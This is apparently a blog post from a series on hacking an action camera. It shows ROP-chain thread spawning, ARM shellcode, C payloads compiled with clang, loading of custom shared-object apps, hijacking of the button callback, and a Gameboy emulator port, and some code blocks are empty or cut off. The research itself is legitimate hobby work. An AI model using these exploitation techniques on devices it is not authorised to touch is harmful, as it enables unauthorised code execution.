# Spawning a Thread

At this stage, we are jumping straight to our shellcode and exiting - it would be much better if we could simply spawn a thread that runs our payload.

To do this, we rewrite the ROP-chain to execute the following functions (note we could use the **rt_thread** functions, but these nicely provided **pthread** wrappers work well enough):

- **pthread_attr_init( &attr );**
- **pthread_attr_setstacksize( &attr, 0x4000 );**
- **pthread_attr_setschedparam( 0xf );**
- **pthread_create( &thread_id, &attr, thread_function, NULL );**

We use this code to spawn a thread that executes our shellcode (which is the **thread_function** in the above code).

Here is the ROP-chain (minus the **fopen** *test.aac* we saw previously to load the shellcode into a buffer and the fixup stuff):

```

```

*Note:* At this point I was sick of writing ROP-chains so it isn't the most efficient, luckily space isn't much of an issue.

## Payload Modifications

As we are running in a thread now, we'll be able to get rid of the fixup stuff we needed to include before, and we'll need to call **pthread_exit**:

```
-python
    @ print spawned string
    adr r0, spawned_string
    ldr r3, =0xc01a79a0
    blx r3
    @ load chip ID register
    mrc p15, #0, r1, c0, c0, #0
    @ print chip ID
    adr r0, fmt_string
    ldr r3, =0xc01a79a0
    blx r3
    @ print killing self
    adr r0, kill_self_string
    ldr r3, =0xc01a79a0
    blx r3
    @ call pthread_exit
    mov r0, #0x0
    ldr r3, =0xc037f2e4
    blx r3
spawned_string:
    .asciz "\033[35m[PWN]\033[0m THREAD SPAWNED\\n"
fmt_string:
    .asciz "\033[35m[PWN]\033[0m CPU ID REGISTER CONTENTS: 0x%x\\n"
kill_self_string:
    .asciz "\033[35m[PWN]\033[0m KILLING SELF\\n"
```

And it works great:

# Compiling C Code

Now that we have code running in a thread, we need to write some nice code to do something interesting - but before that we need to bridge the gap between C and assembly with a compiler.

I've heard great things about *clang* (shout out Adam), so I figured I'd have a crack at it and safe to say it is much easier than messing about with *gcc*!

To build my code, I used this *Makefile*:

```
-makefile
SRC = payload.c
OBJ = $(SRC:.c=.o)
CFLAGS = --target=armv7-none-eabi -mcpu=cortex-a7 -mfloat-abi=soft -nostdlib -fPIC -nodefaultlibs
LDFLAGS = -Wl,-static -Wl,--gc-sections -Wl,-T,linker.ld

all: clean payload.elf payload.bin

payload.elf: $(OBJ)
	clang $(CFLAGS) $(LDFLAGS) $(OBJ) -o $@

payload.bin: payload.elf
	llvm-objcopy-18 -O binary $< $@

%.o: %.c
	clang $(CFLAGS) -c $< -o $@

clean:
	$(RM) -f payload.elf payload.bin *.o
```

The Makefile specifies how to compile and link a single C file (**payload.c**) into a binary for direct execution. It first compiles the code into an object file, then links it into an ELF using *clang* with specific flags for the ARM Cortex-A7 architecture and bare-metal execution (no stdlib).

A linker script is used to control the final layout of the binary:

```
ENTRY(_start)
SECTIONS {
    . = 0x0;
    .text : {
        *(.text._start)        /* Place _start first */
        *(.text*)              /* All remaining .text sections */
    }
    .rodata : {
        *(.rodata*)            /* All .rodata sections */
    }
}
```

- It sets the entry point to *_start*.
- It places all code at address 0x0, with the *_start* function positioned first, followed by the rest of the code.
- It includes only *.text* (code) and *.rodata* (read-only data) sections, the other sections aren't needed.

It then extracts these specific sections using *llvm-objcopy*, converting the ELF into a binary file. This extraction is done because we want to jump straight into the code.

## Example C Payload

Lets throw together a sample payload to prove it works:

```
-c
#include "payload.h"

__attribute__((section(".text._start")))
int _start() {
    kprintf_t kprintf = (kprintf_t) KPRINTF_ADDRESS;

    kprintf("[*] Hello world!!!\n");

    return 0;
}
```

And here is the output:

![thread_compiled_test.png](/assets/images/analysing_an_action_camera_part_5/thread_compiled_test.png)

Nice, now we can write C code that runs in it's own thread!

# Finding an Emulator

Now we can compile code, we are in a position to look for an emulator to port to the device. The ideal emulator will have the following properties:
- C code
- Easily portable
- Light use of standard library functions

After a brief browse on Github, I came across [this repo](https://github.com/zid/gameboy) which looked simple enough. A lot of the more popular repo's had a bunch of portability stuff for Windows/Linux and I wanted something more bare bones - this looks perfect.

## Issue

So I got to trying to compile this code with the existing method, but it wasn't working at all. As the code is position independent (as we don't know what address the containing buffer will have), heavy use of global variables by the code may be causing issues.

After a few hours of messing to try and get it working, it was not giving in, so I decided to change my approach.

# Apps

Rather than messing about with linker scripts and compiler options, I figured it would be easier to use the existing infrastructure on the device to execute code.

## Reversing Apps

This OS has the concept of apps, which are essentially just shared objects:

![file_app_output.png](/assets/images/analysing_an_action_camera_part_5/file_app_output.png)

The best way to understand how they work is to look at the code we have. I first located a function that opens an app called **lb_app_open** which does the following:
- Calls **dlopen** with the filename of the app to load the shared library
- Searches for the **get_app_if** function in the loaded library using **dlsym**
- Looking at this function in one of the apps, it returns a pointer to a **__data_start** object in memory, which contains a pointer to the apps start function
- If it finds this function, it executes it and uses the output to get the start function address
- It then executes the start function

As we already have code execution, we can skip some parts of this such as the **get_app_if** stage, rather than this we can just fetch the start function directly and run it.

In conclusion, all we need to do is build a shared library, and our initial C payload needs to use **dlopen**/**dlsym** to locate the start function and execute it. As we are using a shared library, we should have less compilation issues and it will hopefully not crash (fingers crossed).

## Building an App

Now we need to build our app, I used the following *Makefile*:

```
-makefile
# Compiler and Linker
CC = clang
LD = ld.lld

# Source files
SRCS = app.c 
OBJS = $(SRCS:.c=.o)

# Output files
OUTPUT = custom.app

# Compiler flags
CFLAGS = --target=armv7-none-eabi -mcpu=cortex-a7 -mfloat-abi=soft -nostdlib -fPIC -nodefaultlibs -O3 -flto -ffunction-sections -fdata-sections -fno-exceptions -fno-rtti -ffast-math -march=armv7-a -mtune=cortex-a7 -Wall -Wextra -Werror

# Linker flags
LDFLAGS = -shared --no-undefined --entry=app_main -T Linker.ld  -O3 --gc-sections --icf=all

# Default rule
all: $(OUTPUT)

# Compile source files to object files
%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# Link object files into a shared object
$(OUTPUT): $(OBJS) Linker.ld
	$(LD) $(LDFLAGS) $(OBJS) -o $@

# Clean up build artifacts
clean:
	rm -f $(OBJS) $(OUTPUT)

.PHONY: all clean
```

And the following linker script:

```
SECTIONS
{
  . = SIZEOF_HEADERS;
  .text : { *(.text) }
  . = ALIGN(0x10);
  .rodata : { *(.rodata) }
  . = ALIGN(0x10);
  .data : { *(.data) }
  . = ALIGN(0x10);
  .bss : { *(.bss) }
}
```

The makefile is pretty similar to the previous one, except it builds it into a shared object (and has a few more optimization flags).

The reason for the strange linker script is because when I wasn't using it, the **dlopen** implementation seemed to have a problem with the padding between segments being **> 0x10** - the addition of this linker script seemed to fix the problem.

## Running an App

Now that we can build apps, we need to figure out how we are actually going to run it. I had an issue where if the app was quite large, the file write primitive wasn't working and was cutting off the end of the app.

The following steps should do the trick:
- Execute our first payload in a thread, which opens a socket to recieve the app (do this due to file write being dodgy with larger files)
- Save the received app to the SD card
- Next call **dlopen** and **dlsym** on the received app to find the entry function
- Call the located entry function and we should be running as a standard-ish app!

Putting together a sample app:

```
-c
#include "app.h"

int app_main() {
    kprintf_t kprintf = (kprintf_t) KPRINTF_ADDRESS;
    kprintf("[2] Hello from loaded app main function!\n");
    return 0;
}
```

After building the first C payload, the above sample app, and adjusting the Python script to send the app to the first C payload, it works:

![app_test.png](/assets/images/analysing_an_action_camera_part_5/app_test.png)

# Porting Emulator

Now that we can run apps, lets see if we can get this emulator working! First, we will need to get control of the display and buttons, otherwise it wouldn't be a very good emulator.

## Screen

The first thing to tackle is the screen, I browsed the code we have, and found a function called **lb_disp_init** - reversing this allowed me to discover its two allocated framebuffers in a structure.

Interestingly, it switches between the two framebuffers around every half a second, which is strange? They must have a reason - either way, it is probably easier to just write to both and not worry about the switching for now.

Here is the code I wrote to locate both of the framebuffers:

```
-c
// Pointer to framebuffer
uint32_t* framebuffer_thing_ptr = (uint32_t*) 0xc0aabb9c;
uint32_t* framebuffer_obj_ptr_1 = (uint32_t*) ((*framebuffer_thing_ptr) + 0xc);
uint32_t* framebuffer_obj_ptr_2 = (uint32_t*) ((*framebuffer_thing_ptr) + 0x2c);
uint32_t* framebuffer_ptr_1 = (uint32_t*) *framebuffer_obj_ptr_1;
uint32_t* framebuffer_ptr_2 = (uint32_t*) *framebuffer_obj_ptr_2;
```

The format of the framebuffer is ARGB, so 4 bytes per pixel on the screen.

I wrote a sample bit of code to write the first framebuffer to be red, and the second one to be green - apologies for the awful video quality...

![red_and_green.gif](/assets/images/analysing_an_action_camera_part_5/red_and_green.gif)

## Buttons

The next issue we have to deal with is getting inputs from the buttons, luckily this is pretty trivial once you find the **key_init** function that registers the key handler callback. To overwrite the callback with code that we control, we can just do the following:

```
-c
// hijack button handler with our handler
uint32_t* key_obj_ptr = (uint32_t*) 0xc09d7b60;
void (**key_callback_ptr)(int, int*) = (void (**)(int, int*)) ((uintptr_t)*key_obj_ptr + 0xc);
*key_callback_ptr = button_press_handle;
```

And with some dynamic testing, the ID for each key is the following (it is found in the second parameter of the callback):

```
-c
enum Button {
    MIDDLE_BUTTON = 0x1c,
    RECORD_BUTTON = 0x66,
    UP_BUTTON = 0x67,
    LEFT_BUTTON = 0x69,
    RIGHT_BUTTON = 0x6a,
    DOWN_BUTTON = 0x6c,
    SNAPSHOT_BUTTON = 0x71,
    POWER_BUTTON = 0x74,
    CAMERA_FLIP_BUTTON = 0x8b,
}; 
```

So now we just write a handler function, note that this function also forces the display to turn on when any button is pressed:

```
-c
void button_press_handle(int idk, int* data_stuff) {
    int button_press_ID = *data_stuff;
    kprintf_t kprintf = (kprintf_t) KPRINTF_ADDRESS;
    kprintf("Button pressed: %d\n", idk);

    // if display is off turn it on
    char * display_on_ptr = (char*) 0xc09d7bb0;
    char display_on = *display_on_ptr;
    kprintf("[*] Display on status: %d\n", display_on);
    if (!display_on){
        lb_eui_screen_standby_switch_t lb_eui_screen_standby_switch = (lb_eui_screen_standby_switch_t) 0xc00839f4;
        lb_eui_screen_standby_switch();
    }

    switch (button_press_ID) {
        case MIDDLE_BUTTON: // START
            kprintf("Button pressed: MIDDLE_BUTTON\n");
            break;
        case RECORD_BUTTON: // A
            kprintf("Button pressed: RECORD_BUTTON\n");
            break;
        case UP_BUTTON: // UP
            kprintf("Button pressed: UP_BUTTON\n");
            break;
        case LEFT_BUTTON: // LEFT
            kprintf("Button pressed: LEFT_BUTTON\n");
            break;
        case RIGHT_BUTTON: // RIGHT
            kprintf("Button pressed: RIGHT_BUTTON\n");
            break;
        case DOWN_BUTTON: // DOWN
            kprintf("Button pressed: DOWN_BUTTON\n");
            break;
        case SNAPSHOT_BUTTON: // B
            kprintf("Button pressed: SNAPSHOT_BUTTON\n");
            break;
        case CAMERA_FLIP_BUTTON: // SELECT
            kprintf("Button pressed: CAMERA_FLIP_BUTTON\n");
            break;
        case POWER_BUTTON:
            kprintf("Button pressed: POWER_BUTTON\n");
            break;
        default:
            kprintf("Button pressed: UNKNOWN (ID: 0x%x)\n", button_press_ID);
            break;
    }
}

```

Now we should have everything we need!

## Code

I won't go into that much detail here as I had to change quite a bit of code, but essentially it involved replacing the **sdl.c** and **sdl.h** files (which were responsible for the button and framebuffer functionality for Linux). 

For managing the LCD, the **POKE** function was modified to scale up the output slightly to 240x216 (from 160x144), and draw into both framebuffers using ARGB format.

For managing the button presses, I wrote **button.h** and **button.c** files that save the button state and timeout after a while - then the **mem.c** file can get the masks to register button presses.

I also had to replace any **stdlib** stuff with functions already in the binary, and there wasn't that many in this emulator so that wasn't too difficult.

After all of that, here is the main function that runs the emulator:

```
-c
#include "gameboy_app.h"
#include "buttons.h"
#include "rom.h"
#include "lcd.h"
#include "mem.h"
#include "cpu.h"
#include "timer.h"

int gameboy_main() {
    kprintf_t kprintf = (kprintf_t) KPRINTF_ADDRESS;
    kprintf("[2] Hello from dynamically loaded gameboy_main function!\n");

    // if display is off turn it on
    char * display_on_ptr = (char*) 0xc09d7bb0;
    char display_on = *display_on_ptr;
    kprintf("[*] Display on status: %d\n", display_on);
    if (!display_on){
        lb_eui_screen_standby_switch_t lb_eui_screen_standby_switch = (lb_eui_screen_standby_switch_t) 0xc00839f4;
        lb_eui_screen_standby_switch();
    }

    // hijack button handler with our handler
    uint32_t* key_obj_ptr = (uint32_t*) 0xc09d7b60;
    void (**key_callback_ptr)(int, int*) = (void (**)(int, int*)) ((uintptr_t)*key_obj_ptr + 0xc);
    *key_callback_ptr = button_press_handle;

    int r = rom_load("/mnt/sdcard/red.gb");

    kprintf("[+] ROM load OK\n");

    // Pointer to framebuffer
    uint32_t* framebuffer_thing_ptr = (uint32_t*) 0xc0aabb9c;
    uint32_t* framebuffer_obj_ptr_1 = (uint32_t*) ((*framebuffer_thing_ptr) + 0xc);
    uint32_t* framebuffer_obj_ptr_2 = (uint32_t*) ((*framebuffer_thing_ptr) + 0x2c);
    uint32_t* framebuffer_ptr_1 = (uint32_t*) *framebuffer_obj_ptr_1;
    uint32_t* framebuffer_ptr_2 = (uint32_t*) *framebuffer_obj_ptr_2;

    // Print the pointers using kprintf
    kprintf("Pointer to ptr: 0x%08x\n", (unsigned int)framebuffer_thing_ptr);
    kprintf("Pointer to framebuffer obj ptr_1: 0x%08x\n", (unsigned int)framebuffer_obj_ptr_1);

# Demo

Let see it in action!

Here is the output we see on the UART:

And here is what we see on the device!

And some high octane gameplay:

Note that we should be able to play any Gameboy ROM supported by the emulator - not just Pokemon!

# Conclusion

In this blog, we expanded our limited assembly shellcode to be written in C using clang and run it on its own thread instead. We then did some reverse engineering of the app format and constructed our own mock apps which we ran with an earlier payload. Finally we ported a gameboy emulator to the device, and used it to play some classic Pokemon.
